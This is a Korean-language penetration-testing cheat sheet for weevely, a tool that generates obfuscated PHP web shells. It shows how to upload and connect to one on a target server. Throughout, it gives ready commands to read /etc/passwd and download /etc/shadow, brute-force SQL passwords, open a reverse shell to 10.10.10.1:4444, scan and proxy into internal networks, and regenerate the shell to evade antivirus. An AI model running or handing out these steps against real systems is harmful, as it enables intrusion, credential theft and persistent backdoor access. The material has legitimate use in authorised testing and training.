# weevely 웹셸 생성·접속

- weevely — 작고 난독화된 PHP 웹셸 에이전트를 생성해 대상 서버에 업로드한 뒤, HTTP 위에서 파일·SQL·리버스 셸·프록시 등 30여 개 모듈을 쓸 수 있는 Python 도구.
- 파일 업로드 취약점으로 PHP 파일을 올릴 수 있을 때, 짧은 웹셸보다 모듈형 후속 접근이 필요할 때, 업로드한 에이전트로 파일 탐색·SQL 콘솔·내부망 스캔을 이어갈 때.
- Python 환경 필요. Kali는 pip 설치 또는 소스 실행, Windows 소스는 workspace\web\src-epinna-weevely3-master\weevely3-master\.

## 기본 명령어 구조

```bash
weevely generate <password> <path.php>
weevely <URL> <password> [cmd]
```

## 에이전트 생성

```bash
weevely generate P@ssw0rd shell.php
```

- generate는 비밀번호 기반 난독화 PHP 에이전트를 만든다. 같은 비밀번호를 아는 세션만 접속할 수 있다.
- 실행할 때마다 코드가 달라지는 다형성(polymorphic) 구조라 탐지 우회에 재생성을 활용할 수 있다.

## 접속

```bash
weevely http://10.10.10.10/uploads/shell.php P@ssw0rd
# 접속하면서 바로 명령 실행
weevely http://10.10.10.10/uploads/shell.php P@ssw0rd whoami
```

- 업로드 경로를 모르면 ffuf로 shell.php 위치를 먼저 찾는다.
- 프롬프트에서 일반 셸처럼 입력하면 HTTP 요청으로 전달된다. 세션은 세션 파일로 저장되고 weevely <세션파일>로 재접속할 수 있다.

## :file_* 모듈

```text
:file_ls /var/www/html
:file_read /etc/passwd
:file_download /etc/shadow
:file_upload local.php /var/www/html/
:file_find / -name *conf*
:file_enum /home /tmp /backup
:file_rm /var/www/html/shell.php
:file_upload2web local.php
```

- file_upload2web은 웹서버가 실제로 서비스하는 경로를 자동 탐지해 업로드까지 처리한다.
- file_enum은 경로 존재 여부만 빠르게 확인할 때 쓴다.

## 소스로 실행

```bash
git clone https://github.com/epinna/weevely3.git
cd weevely3
pip install .
weevely generate P@ssw0rd shell.php

# 콘솔 명령이 없는 환경에서는 모듈로 직접 실행
PYTHONPATH=src python3 -m weevely.main generate P@ssw0rd shell.php
PYTHONPATH=src python3 -m weevely.main http://target/shell.php P@ssw0rd
```

- Windows에서는 python3 대신 python을 쓰고, 소스 폴더의 src 경로를 PYTHONPATH로 잡는다.

## 후속 모듈 예시

```text
:system_info                  # 시스템·PHP 설정 정보
:system_procs                 # 프로세스 목록
:sql_console -u root -p pass  # SQL 콘솔
:bruteforce_sql localhost root /usr/share/wordlists/rockyou.txt
:backdoor_reverse 10.10.10.1 4444 php     # 리버스 셸
:net_scan 10.10.10.0/24 22,80,443         # 내부 포트 스캔
:net_proxy                    # 대상 경유 HTTP 프록시
:audit_suidsgid /             # SUID/SGID 파일 탐색
:audit_filesystem /var/www    # 권한 약한 경로 감사
```

- SQL 계정 크랙(:bruteforce_sql)과 내부 스캔(:net_scan)으로 DB·내부망으로 피벗을 이어간다.

## 팁·트러블슈팅

- 접속이 되는데 명령 출력이 없으면 에이전트 경로·비밀번호를 재확인하고, 브라우저로 직접 요청해 PHP 에러 여부를 본다.
- AV가 shell.php를 잡으면 generate를 다시 돌린다. 재생성 시 난독화가 달라진다.
- 접속이 끊기면 세션 파일로 복구한다. weevely <session file>.
- M2Crypto 등 의존성 설치 실패 시 pip install . 대신 README 위키의 Install 절차를 따른다.
